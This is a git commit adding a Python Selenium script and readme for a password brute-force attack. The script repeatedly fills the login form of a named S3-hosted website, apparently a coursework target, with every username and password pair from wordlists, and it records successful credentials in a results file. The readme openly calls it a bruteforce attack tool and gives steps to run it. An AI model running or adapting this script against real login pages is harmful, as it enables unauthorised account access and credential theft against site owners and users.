6ec978ab037a00e7ebd7f0b7785edd132fecf562
walkenzhong <walkenzhong@gmail.com>
2020-10-09 14:49:26 +1100

    update win and mac

---
+++ windows/bruteforce.py
@@ -0,0 +1,42 @@
+import time
+import pandas as pd
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+import sys
+def login(username,password):
+    for name in username:
+        for pwd in password:
+            driver = webdriver.Chrome("chromedriver.exe")
+            driver.get("http://s3-9447-t2-site.s3-website-us-east-1.amazonaws.com/")
+            print(driver.title)
+            driver.find_element_by_id("logInButton").click()
+            time.sleep(2)
+            driver.find_element_by_id("email").send_keys(name)
+            driver.find_element_by_id("pwd").send_keys(pwd)
+            driver.find_element_by_id("login-modal-button").click()
+            time.sleep(4)
+            try:
+                now_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+                driver.find_element_by_id("logOutButton").click()
+                print(f'success,username:{name},password:{pwd}')
+                f = open('result.txt','a')
+                f.write(f'{now_time},username:{name},password:{pwd}\n')
+                f.close()
+            except:
+                print("error")
+            driver.close()
+            driver.quit()
+def username_and_psaaword():
+    username = []
+    password = []
+    with open('username.txt','r') as f:
+        for line in f:
+            username.extend(list(line.strip('\n').split(',')))
+    with open('password.txt','r') as f:
+        for line in f:
+            password.extend(list(line.strip('\n').split(',')))
+    return username,password
+
+if '__name__' == '__name__':
+    username,password = username_and_psaaword()
+    login(username,password)
---
+++ windows/readme.md
@@ -0,0 +1,24 @@
+# Readme
+this script is for bruteforce attack  
+## requirements
+1. Windows
+2. chrome version 85
+3. python3
+
+## how to use it?
+#### step 1
+```
+pip install -r requirements.txt
+```
+#### step 2
+```
+python bruteforce.py
+```
+
+## File
+#### username.txt
+username list
+#### password.txt
+password list
+#### result.txt
+the correct username and password for login
